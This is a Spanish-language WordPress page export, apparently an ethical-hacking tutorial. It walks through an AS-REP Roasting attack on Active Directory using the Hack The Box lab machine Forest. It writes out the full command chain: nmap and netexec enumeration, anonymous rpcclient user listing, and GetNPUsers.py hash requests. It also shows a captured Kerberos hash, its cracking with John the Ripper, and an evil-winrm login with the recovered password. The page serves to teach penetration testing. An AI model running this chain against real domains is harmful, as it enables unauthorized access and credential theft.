{"id":133,"date":"2024-02-07T20:40:31","date_gmt":"2024-02-07T19:40:31","guid":{"rendered":"http:\/\/localhost\/ethicalhacking\/?page_id=133"},"modified":"2024-02-07T20:40:31","modified_gmt":"2024-02-07T19:40:31","slug":"ataque-a-directorio-activo-as-reproast-attack","status":"publish","type":"page","link":"http:\/\/localhost\/ethicalhacking\/ataque-a-directorio-activo-as-reproast-attack\/","title":{"rendered":"Ataque a Directorio Activo (AS-RepRoast Attack)"},"content":{"rendered":"\n<p>Definici\u00f3n:<\/p>\n\n\n\n<p>Active Directory es un servicio de directorio desarrollado por Microsoft que centraliza el almacenamiento de informaci\u00f3n sobre objetos de red, como usuarios, grupos, computadoras y recursos compartidos en una red de computadoras basada en Windows. Permite a los administradores gestionar y organizar recursos de red de forma eficiente y controlar el acceso a estos recursos mediante pol\u00edticas de seguridad y permisos.<\/p>\n\n\n\n<p>El ataque ASREPRoasting es una t\u00e9cnica de ataque dirigida contra contrase\u00f1as de cuentas de usuario en un entorno de Active Directory. Se aprovecha de la debilidad en la autenticaci\u00f3n de usuarios que no requieren autenticaci\u00f3n de pre-autenticaci\u00f3n (AS-REP). El ataque consiste en solicitar tickets de autenticaci\u00f3n para cuentas de usuario que no requieren pre-autenticaci\u00f3n y luego \u00abasar\u00bb o \u00abroast\u00bb estos tickets para intentar descifrar las contrase\u00f1as de las cuentas objetivo.<\/p>\n\n\n\n<p>En este cap\u00edtulo vamos a realizar un ataque a un entorno empresarial  con Active Directory, para ello nos emplearemos con la m\u00e1quina Forest (10.10.10.161) de la plataforma Hack The Box.<\/p>\n\n\n\n<p>Primero realizamos un escaneo de puertos abiertos con la herramienta nmap:<\/p>\n\n\n\n<p>sudo nmap -p- &#8211;open -sS &#8211;min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG allPorts<\/p>\n\n\n\n<p>El escaneo nos muestra que el puerto 88 est\u00e1 expuesto, lo que confirma que estamos ante un Domain Controller (Directorio Activo):<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1379\" height=\"373\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-30.png\" alt=\"\" class=\"wp-image-134\" style=\"width:1029px;height:auto\"\/><\/figure>\n\n\n\n<p>Hemos descubierto que el puerto 445 (SMB) tambi\u00e9n est\u00e1 abierto, esto nos facilitar\u00e1 la manera de identificar el dominio que se est\u00e1 empleando con la herramienta netexec:<\/p>\n\n\n\n<p>netexec smb 10.10.10.161<\/p>\n\n\n\n<p>Esto nos ha permitido descubrir que estamos ante un Windows Server 2016 y que el dominio es htb.local (domain:htb.local) <\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1337\" height=\"347\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-31.png\" alt=\"\" class=\"wp-image-135\" style=\"width:1026px;height:auto\"\/><\/figure>\n\n\n\n<p>Llegados a este punto necesitamos obtener una posible lista de usuarios v\u00e1lidos del dominio, para ello utilizaremos la herramienta rpclient :<\/p>\n\n\n\n<p>rpcclient -U \u00ab\u00bb 10.10.10.161 -N<\/p>\n\n\n\n<p>Con enumdomusers podemos listar los usuarios del dominio:<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"947\" height=\"616\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-32.png\" alt=\"\" class=\"wp-image-136\" style=\"width:1032px;height:auto\"\/><\/figure>\n\n\n\n<p>Creamos a continuaci\u00f3n un archivo con la lista de usuarios obtenidos, el archivo los hemos llamado users:<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"865\" height=\"476\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-33.png\" alt=\"\" class=\"wp-image-137\" style=\"width:1013px;height:auto\"\/><\/figure>\n\n\n\n<p>En esta fase avanzada de la intrusi\u00f3n, procederemos a  realizar el ataque ASREPRoasting que consiste en obtener un hash y posteriormente descifrarlo, para ello ser\u00e1 necesario conocer el dominio y disponer de una lista de usuarios, como tenemos todo lo necesario ejecutamos el siguiente comando:<\/p>\n\n\n\n<p>python3 GetNPUsers.py htb.local\/ -no-pass -usersfile users<\/p>\n\n\n\n<p><\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1866\" height=\"564\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-34.png\" alt=\"\" class=\"wp-image-138\" style=\"width:1021px;height:auto\"\/><\/figure>\n\n\n\n<p>Hemos logrado obtener el hash que corresponde a un usuario, en este caso el usuario es \u00absvc-alfresco\u00bb , el hash lo almacenamos en un archivo (nombrado hash)<\/p>\n\n\n\n<p>$krb5asrep$23$svc-alfresco@HTB.LOCAL:cf87ded3ea5ad5b2bf0dd94e4328bf87$6fd9bb6869ad51ed870427f0e29214345e9fe42248852f978c3acf4de4fc6457491746ee3f2e1a6904353f37bb99846da1d1bf233d1e8e6045a93b5284bdacc0aedf37f2f49be38d45fddf8f0c8ca5a6e0b2bee4a304fd31fbc0e3d15f75aedb2d57b609a36040830a90feba3dc8f844cb9b4f48be4284b239a615388c45ed9c6d93e4df0f26aabd97bcde217397f515a824b1d047e3ccb4e12f2afb2f919f5431bbb9ce21193e1b3e5f2d755c77ea96f4c72a96bd7d7f8d6c4c810176daa20f91f99503406ca5e5f5f68236d33496de9a8e7d41143f4968952ff2f01dc68a287c30db14fc92<\/p>\n\n\n\n<p>A continuaci\u00f3n desciframos el hash empleando la herramienta John The Ripper para cracking de contrase\u00f1as y emplearemos el archivo rockyou.txt que contiene 14 millones de contrase\u00f1as posibles:<\/p>\n\n\n\n<p>sudo john hash &#8211;wordlist=rockyou.txt<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1152\" height=\"429\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-35.png\" alt=\"\" class=\"wp-image-139\" style=\"width:993px;height:auto\"\/><\/figure>\n\n\n\n<p>Hemos logrado descifrar el hash y obtener la correspondiente contrase\u00f1a del usuario svc-alfresco:<\/p>\n\n\n\n<p>s3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL)<\/p>\n\n\n\n<p>verificamos la contrase\u00f1a con netexec y nos la da por v\u00e1lida:<\/p>\n\n\n\n<p>netexec smb 10.10.10.161 -u &#8216;svc-alfresco&#8217; -p &#8216;s3rvice&#8217;<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1308\" height=\"290\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-36.png\" alt=\"\" class=\"wp-image-140\" style=\"width:1001px;height:auto\"\/><\/figure>\n\n\n\n<p>Tambi\u00e9n somos capaces de listar los recursos compartidos del usuario:<\/p>\n\n\n\n<p>netexec smb 10.10.10.161 -u &#8216;svc-alfresco&#8217; -p &#8216;s3rvice&#8217; &#8211;shares<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1320\" height=\"523\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-37.png\" alt=\"\" class=\"wp-image-141\" style=\"width:999px;height:auto\"\/><\/figure>\n\n\n\n<p>Y finalmente, con  la herramienta evil-winrm logramos autenticarnos comprometiendo la m\u00e1quina Windows y concluyendo el ataque con \u00e9xito:<\/p>\n\n\n\n<p>evil-winrm -i 10.10.10.161 -u &#8216;svc-alfresco&#8217; -p &#8216;s3rvice&#8217;<\/p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1243\" height=\"590\" src=\"http:\/\/localhost\/ethicalhacking\/wp-content\/uploads\/2024\/02\/image-39.png\" alt=\"\" class=\"wp-image-143\" style=\"width:1009px;height:auto\"\/><\/figure>\n","protected":false},"excerpt":{"rendered":"<p>Definici\u00f3n: Active Directory es un servicio de directorio desarrollado por Microsoft que centraliza el almacenamiento de informaci\u00f3n sobre objetos de red, como usuarios, grupos, computadoras y recursos compartidos en una red de computadoras basada en Windows. Permite a los administradores gestionar y organizar recursos de red de forma eficiente y controlar el acceso a estos [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":0,"parent":0,"menu_order":0,"comment_status":"closed","ping_status":"closed","template":"","meta":{"footnotes":""},"_links":{"self":[{"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/pages\/133"}],"collection":[{"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/pages"}],"about":[{"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/types\/page"}],"author":[{"embeddable":true,"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/comments?post=133"}],"version-history":[{"count":1,"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/pages\/133\/revisions"}],"predecessor-version":[{"id":144,"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/pages\/133\/revisions\/144"}],"wp:attachment":[{"href":"http:\/\/localhost\/ethicalhacking\/wp-json\/wp\/v2\/media?parent=133"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}